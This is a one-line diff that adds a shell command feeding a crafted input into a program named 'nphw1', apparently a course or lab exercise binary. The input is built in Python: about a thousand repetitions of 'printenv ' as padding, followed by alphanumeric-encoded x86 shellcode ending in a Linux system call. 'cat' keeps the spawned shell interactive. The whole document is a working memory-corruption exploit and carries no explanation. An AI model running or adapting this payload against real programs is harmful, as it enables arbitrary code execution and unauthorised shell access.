@@ -1,0 +1,1 @@
+(python -c 'print "printenv "*1003 + "j0X40P5ZZCX54u00Pj0X405ZZZZ5uu83PT[j0X40PZPYAAAAAAAAAAAQXRY\xcd\x80" + " printenv " +"\n"';cat) | ./nphw1
